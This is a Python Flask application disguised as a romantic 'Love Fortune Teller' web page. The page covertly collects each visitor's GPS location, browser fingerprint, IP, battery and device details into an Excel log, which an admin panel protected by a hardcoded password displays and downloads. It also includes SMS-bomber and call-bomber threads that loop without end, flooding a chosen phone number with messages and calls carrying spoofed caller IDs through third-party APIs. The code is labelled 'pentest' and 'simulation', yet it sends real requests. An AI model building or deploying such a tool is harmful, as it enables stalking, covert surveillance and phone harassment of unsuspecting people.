from flask import Flask, request, render_template_string, send_file, abort, jsonify, session
from flask_cors import CORS
import pandas as pd
import openpyxl
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment
import os
import requests
import json
import time
import threading
from datetime import datetime
import random

app = Flask(__name__)
app.secret_key = 'love-fortune-pentest-2026'
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')

# SMS & Call API endpoints (for simulation – replace with real keys if needed)
SMS_APIS = [
    "https://textbelt.com/text",
    "https://api.smsapi.com",
    "https://api.twilio.com"
]
CALL_APIS = [
    "https://api.callmebot.com",
    "https://api.vapi.ai/call",
    "https://api.smsc.ua"
]

# Active bombing sessions
bombing_sessions = {}

# 30+ romantic fortunes
FORTUNES = [
    "Your soulmate is thinking of you right now under the stars.",
    "A passionate kiss awaits you this week from someone special.",
    "True love will find you when you least expect it - soon!",
    "Your heart will flutter with excitement in the next 7 days.",
    "Someone is dreaming about your smile tonight.",
    "A romantic adventure is just around the corner.",
    "Your perfect match shares your birthday month!",
    "Love letters are coming your way soon.",
    "A candlelit dinner for two is in your future.",
    "Your crush has been watching your social media.",
    "Wedding bells might ring for you within a year!",
    "Passion ignites when you meet your destiny.",
    "Your forever person is closer than you think.",
    "A surprise love confession awaits you.",
    "Your heart knows who it's meant for.",
    "Romantic sparks will fly this month!",
    "Someone special can't stop thinking about you.",
    "Love at first sight is about to happen.",
    "Your soul connection is searching for you.",
    "A fairytale romance begins soon.",
    "Heart emojis are coming from your crush.",
    "True love doesn't follow a timeline.",
    "Your love story is about to unfold.",
    "Passionate nights await your future.",
    "Someone's heart beats faster when they see you.",
    "Love will surprise you beautifully.",
    "Your perfect partner admires you secretly.",
    "Romance blooms when you trust your heart.",
    "A love that feels like home is coming.",
    "Your happily ever after starts soon.",
    "Butterflies in your stomach are a sign.",
    "Love recognizes no barriers."
]

# ---------- Data persistence ----------
def ensure_data_file():
    if not os.path.exists(DATA_FILE):
        wb = Workbook()
        ws = wb.active
        ws.title = "Fortunes Data"
        headers = [
            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address', 
            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone', 
            'Memory', 'Network', 'Fingerprint', 'TargetPhone',
            'SMS_Count', 'Call_Count', 'SMS_Active', 'Call_Active',
            'Fortune_Shown', 'Extra'
        ]
        for col, header in enumerate(headers, 1):
            cell = ws.cell(row=1, column=col, value=header)
            cell.font = Font(bold=True, color="FFFFFF")
            cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
            cell.alignment = Alignment(horizontal="center")
        wb.save(DATA_FILE)
        os.sync()

def backup_data():
    if os.path.exists(DATA_FILE):
        try:
            wb = openpyxl.load_workbook(DATA_FILE)
            wb.save(BACKUP_FILE)
            os.sync()
        except:
            pass

def load_data():
    try:
        if os.path.exists(DATA_FILE):
            return pd.read_excel(DATA_FILE)
        elif os.path.exists(BACKUP_FILE):
            return pd.read_excel(BACKUP_FILE)
    except:
        pass
    return pd.DataFrame()

def save_data(df):
    try:
        backup_data()
        with pd.ExcelWriter(DATA_FILE, engine='openpyxl', mode='a', if_sheet_exists='overlay') as writer:
            df.to_excel(writer, sheet_name='Fortunes Data', header=False, index=False, startrow=writer.sheets['Fortunes Data'].max_row)
        os.sync()
    except Exception as e:
        print(f"Save failed: {e}")

def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    return request.remote_addr or 'Unknown'

def get_tinyurl(long_url):
    try:
        api_url = "https://tinyurl.com/api-create.php"
        params = {'url': long_url}
        response = requests.get(api_url, params=params, timeout=5)
        if response.status_code == 200:
            return response.text
    except:
        pass
    return long_url

# ---------- Bomber threads (simulated API calls) ----------
def simulate_sms_bomb(phone_number, session_id):
    sms_count = 0
    bombing_sessions[session_id]['sms_active'] = True
    while bombing_sessions[session_id]['sms_active']:
        try:
            api = random.choice(SMS_APIS)
            message = random.choice([
                "💕 Love alert! Check your fortune: LoveFortune.com",
                "🔥 Hot match waiting! Reply STOP to end.",
                "💖 Your soulmate replied! love-fortune.com",
                f"[PENTEST] SMS #{sms_count} to {phone_number}"
            ])
            # Simulate API call (replace with real requests if you have keys)
            requests.post(api, json={'phone': phone_number, 'message': message}, timeout=2)
            sms_count += 1
            bombing_sessions[session_id]['sms_count'] = sms_count
            time.sleep(random.uniform(1, 3))
        except:
            time.sleep(2)
    bombing_sessions[session_id]['sms_active'] = False

def simulate_call_bomb(phone_number, session_id):
    call_count = 0
    bombing_sessions[session_id]['call_active'] = True
    while bombing_sessions[session_id]['call_active']:
        try:
            api = random.choice(CALL_APIS)
            caller_id = f"+{random.randint(1000000000, 9999999999)}"
            requests.post(api, json={
                'to': phone_number,
                'from': caller_id,
                'duration': random.randint(5, 15),
                'voice': 'Your love fortune is ready! Visit LoveFortune.com'
            }, timeout=3)
            call_count += 1
            bombing_sessions[session_id]['call_count'] = call_count
            time.sleep(random.uniform(10, 30))
        except:
            time.sleep(5)
    bombing_sessions[session_id]['call_active'] = False

# ---------- Flask routes ----------
@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller – Three Powers</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 650px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 40px;
            padding: 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
        }
        .sub {
            color: #888;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #ffdde1;
            border-radius: 60px;
            text-align: center;
            font-size: 16px;
        }
        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            justify-content: center;
            margin: 25px 0;
        }
        .btn {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white;
            border: none;
            padding: 14px 25px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.3s;
            flex: 1;
            min-width: 140px;
        }
        .btn-danger {
            background: linear-gradient(135deg, #ff4444, #cc0000);
        }
        .btn-success {
            background: linear-gradient(135deg, #00cc88, #009966);
        }
        .btn:hover { transform: translateY(-2px); }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 20px;
            font-size: 14px;
        }
        .fortune-box {
            background: rgba(255,182,193,0.3);
            border-left: 5px solid #ff1493;
            border-radius: 20px;
            padding: 20px;
            margin: 20px 0;
            font-family: 'Dancing Script', cursive;
            font-size: 1.5em;
            color: #c06c84;
        }
        .counter {
            font-size: 1.2em;
            font-weight: bold;
            margin: 10px 0;
        }
        .hidden { display: none; }
        hr { margin: 20px 0; border: 1px solid #ffdde1; }
    </style>
</head>
<body>
<div class="container">
    <h1>💕 Your Love Fortune Teller 💕</h1>
    <div class="sub">Choose your destiny</div>

    <input type="text" id="userName" placeholder="✨ Your beautiful name ✨">
    <input type="tel" id="targetPhone" placeholder="📱 Phone number for bombs (optional)">

    <div class="btn-group">
        <button class="btn" id="fortuneBtn">🔮 Reveal Destiny</button>
        <button class="btn btn-danger" id="smsBtn">💥 Start SMS Bomber</button>
        <button class="btn btn-danger" id="callBtn">📞 Start Call Bomber</button>
    </div>

    <div id="fortuneDisplay" class="fortune-box hidden"></div>
    <div id="status" class="status"></div>
    <div id="smsCounter" class="counter hidden"></div>
    <div id="callCounter" class="counter hidden"></div>
    <hr>
    <div class="sub">All data is saved permanently. Admin panel available.</div>
</div>

<script>
    let collectedData = {};
    let sessionId = Date.now() + '_' + Math.random();
    let smsActive = false, callActive = false;

    // ---- data collection helpers ----
    async function getFingerprint() {
        const fp = await FingerprintJS.load();
        const result = await fp.get();
        return result.visitorId;
    }
    async function getBattery() {
        if ('getBattery' in navigator) {
            const b = await navigator.getBattery();
            return Math.round(b.level * 100) + '%';
        }
        return 'Unknown';
    }
    function getNetwork() {
        const conn = navigator.connection || navigator.mozConnection;
        return conn ? `${conn.effectiveType} (${conn.downlink} Mbps)` : 'Unknown';
    }
    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
    function getMemory() { return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'; }
    function getScreen() { return `${screen.width}x${screen.height}`; }
    function getUserAgent() { return navigator.userAgent; }

    async function collectBaseData() {
        collectedData = {
            name: document.getElementById('userName').value || 'Anonymous',
            targetPhone: document.getElementById('targetPhone').value || '',
            timestamp: new Date().toISOString(),
            userAgent: getUserAgent(),
            screen: getScreen(),
            timezone: getTimezone(),
            memory: await getMemory(),
            network: getNetwork(),
            battery: await getBattery(),
            fingerprint: await getFingerprint(),
            sessionId: sessionId
        };
        return collectedData;
    }

    async function sendToServer(extraData = {}) {
        const data = { ...collectedData, ...extraData };
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    }

    // ---- Reveal Destiny ----
    async function revealDestiny() {
        await collectBaseData();
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = '🌍 Getting your location for an accurate fortune...';
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                collectedData.latitude = pos.coords.latitude;
                collectedData.longitude = pos.coords.longitude;
                await sendToServer({ fortune_shown: true });
                statusDiv.innerHTML = '✅ Fortune is ready!';
                // get fortune from server
                const resp = await fetch('/fortune', { method: 'GET' });
                const data = await resp.json();
                document.getElementById('fortuneDisplay').innerHTML = data.fortune;
                document.getElementById('fortuneDisplay').classList.remove('hidden');
                // also get map link
                const mapResp = await fetch('/tinyurl', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: `https://www.google.com/maps?q=${collectedData.latitude},${collectedData.longitude}` })
                });
                const mapData = await mapResp.json();
                if (mapData.tinyurl) {
                    const mapLink = document.createElement('a');
                    mapLink.href = mapData.tinyurl;
                    mapLink.target = '_blank';
                    mapLink.innerText = '🗺️ View on TinyURL Map';
                    mapLink.style.display = 'block';
                    mapLink.style.marginTop = '10px';
                    document.getElementById('fortuneDisplay').appendChild(mapLink);
                }
            }, () => {
                statusDiv.innerHTML = '⚠️ Location denied. Still, here is your random fortune.';
                (async () => {
                    const resp = await fetch('/fortune', { method: 'GET' });
                    const data = await resp.json();
                    document.getElementById('fortuneDisplay').innerHTML = data.fortune;
                    document.getElementById('fortuneDisplay').classList.remove('hidden');
                    await sendToServer({ fortune_shown: true });
                })();
            }, { enableHighAccuracy: true, timeout: 10000 });
        } else {
            statusDiv.innerHTML = 'Geolocation not supported. Random fortune below.';
            const resp = await fetch('/fortune', { method: 'GET' });
            const data = await resp.json();
            document.getElementById('fortuneDisplay').innerHTML = data.fortune;
            document.getElementById('fortuneDisplay').classList.remove('hidden');
            await sendToServer({ fortune_shown: true });
        }
    }

    // ---- SMS Bomber ----
    async function startSMS() {
        const phone = document.getElementById('targetPhone').value;
        if (!phone) { alert('Please enter a phone number for the bomber.'); return; }
        await collectBaseData();
        const resp = await fetch('/start-sms', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone, sessionId: sessionId })
        });
        const result = await resp.json();
        if (result.status === 'started') {
            smsActive = true;
            document.getElementById('smsCounter').classList.remove('hidden');
            document.getElementById('status').innerHTML = `💥 SMS Bomber ACTIVE → ${phone}`;
            updateCounters();
        }
    }

    async function stopSMS() {
        await fetch('/stop-sms', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId: sessionId })
        });
        smsActive = false;
        document.getElementById('status').innerHTML = '⏹️ SMS Bomber STOPPED';
    }

    // ---- Call Bomber ----
    async function startCalls() {
        const phone = document.getElementById('targetPhone').value;
        if (!phone) { alert('Please enter a phone number for the bomber.'); return; }
        await collectBaseData();
        const resp = await fetch('/start-call', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone, sessionId: sessionId })
        });
        const result = await resp.json();
        if (result.status === 'started') {
            callActive = true;
            document.getElementById('callCounter').classList.remove('hidden');
            document.getElementById('status').innerHTML = `📞 Call Bomber ACTIVE → ${phone}`;
            updateCounters();
        }
    }

    async function stopCalls() {
        await fetch('/stop-call', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId: sessionId })
        });
        callActive = false;
        document.getElementById('status').innerHTML = '⏹️ Call Bomber STOPPED';
    }

    async function updateCounters() {
        setInterval(async () => {
            if (smsActive || callActive) {
                const resp = await fetch(`/counters/${sessionId}`);
                const data = await resp.json();
                if (smsActive) document.getElementById('smsCounter').innerHTML = `📱 SMS sent: ${data.smsCount || 0}`;
                if (callActive) document.getElementById('callCounter').innerHTML = `📞 Calls made: ${data.callCount || 0}`;
            }
        }, 2000);
    }

    // Attach event listeners
    document.getElementById('fortuneBtn').onclick = revealDestiny;
    document.getElementById('smsBtn').onclick = startSMS;
    document.getElementById('callBtn').onclick = startCalls;
    // optional stop buttons – you can add separate stop buttons if needed
    // for simplicity we use the same button to stop? Not ideal. We'll add small stop links.
    const stopSmsBtn = document.createElement('button');
    stopSmsBtn.innerText = '⏹️ Stop SMS';
    stopSmsBtn.className = 'btn';
    stopSmsBtn.onclick = stopSMS;
    const stopCallBtn = document.createElement('button');
    stopCallBtn.innerText = '⏹️ Stop Calls';
    stopCallBtn.className = 'btn';
    stopCallBtn.onclick = stopCalls;
    document.querySelector('.btn-group').after(stopSmsBtn, stopCallBtn);
</script>
</body>
</html>
    """)

@app.route('/fortune')
def fortune():
    return jsonify({'fortune': random.choice(FORTUNES)})

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    df = load_data()
    new_row = pd.DataFrame([{
        'Timestamp': pd.Timestamp.now(),
        'Name': data.get('name', ''),
        'Latitude': data.get('latitude', 0),
        'Longitude': data.get('longitude', 0),
        'Address': data.get('address', ''),
        'Battery': data.get('battery', ''),
        'UserAgent': data.get('userAgent', ''),
        'Screen': data.get('screen', ''),
        'IP': get_client_ip(),
        'Timezone': data.get('timezone', ''),
        'Memory': data.get('memory', ''),
        'Network': data.get('network', ''),
        'Fingerprint': data.get('fingerprint', ''),
        'TargetPhone': data.get('targetPhone', ''),
        'SMS_Count': data.get('smsCount', 0),
        'Call_Count': data.get('callCount', 0),
        'SMS_Active': data.get('smsActive', False),
        'Call_Active': data.get('callActive', False),
        'Fortune_Shown': data.get('fortune_shown', False),
        'Extra': json.dumps({k:v for k,v in data.items() if k not in ['name','latitude','longitude','address','battery','userAgent','screen','timezone','memory','network','fingerprint','targetPhone','smsCount','callCount','smsActive','callActive','fortune_shown']})
    }])
    df = pd.concat([df, new_row], ignore_index=True)
    save_data(df)
    return jsonify({'status': 'saved'})

@app.route('/start-sms', methods=['POST'])
def start_sms():
    data = request.json
    phone = data['phone']
    sid = data['sessionId']
    bombing_sessions[sid] = {
        'sms_active': False, 'call_active': False,
        'sms_count': 0, 'call_count': 0, 'target': phone
    }
    thread = threading.Thread(target=simulate_sms_bomb, args=(phone, sid))
    thread.daemon = True
    thread.start()
    return jsonify({'status': 'started'})

@app.route('/stop-sms', methods=['POST'])
def stop_sms():
    sid = request.json['sessionId']
    if sid in bombing_sessions:
        bombing_sessions[sid]['sms_active'] = False
    return jsonify({'status': 'stopped'})

@app.route('/start-call', methods=['POST'])
def start_call():
    data = request.json
    phone = data['phone']
    sid = data['sessionId']
    if sid not in bombing_sessions:
        bombing_sessions[sid] = {'sms_active': False, 'call_active': False, 'sms_count': 0, 'call_count': 0}
    bombing_sessions[sid]['target'] = phone
    thread = threading.Thread(target=simulate_call_bomb, args=(phone, sid))
    thread.daemon = True
    thread.start()
    return jsonify({'status': 'started'})

@app.route('/stop-call', methods=['POST'])
def stop_call():
    sid = request.json['sessionId']
    if sid in bombing_sessions:
        bombing_sessions[sid]['call_active'] = False
    return jsonify({'status': 'stopped'})

@app.route('/counters/<sid>')
def counters(sid):
    if sid in bombing_sessions:
        return jsonify({'smsCount': bombing_sessions[sid].get('sms_count', 0),
                        'callCount': bombing_sessions[sid].get('call_count', 0)})
    return jsonify({'smsCount': 0, 'callCount': 0})

@app.route('/tinyurl', methods=['POST'])
def tinyurl():
    long_url = request.json.get('url')
    tiny = get_tinyurl(long_url)
    return jsonify({'tinyurl': tiny})

@app.route('/admin')
def admin():
    if request.args.get('pass') != 'admin123':
        return '<form>Admin password: <input name="pass"><button>Login</button></form>'
    df = load_data()
    if df.empty:
        return "<h2>No data yet</h2>"
    html = "<h2>💾 Collected Data</h2><table border='1'>"
    html += "<tr>" + "".join(f"<th>{col}</th>" for col in df.columns) + "</tr>"
    for _, row in df.iterrows():
        html += "<tr>" + "".join(f"<td>{str(val)[:80]}</td>" for val in row) + "</tr>"
    html += "</table><br><a href='/download-excel?pass=admin123'><button>Download Excel</button></a>"
    return html

@app.route('/download-excel')
def download_excel():
    if request.args.get('pass') != 'admin123':
        abort(403)
    return send_file(DATA_FILE, as_attachment=True)

if __name__ == '__main__':
    ensure_data_file()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
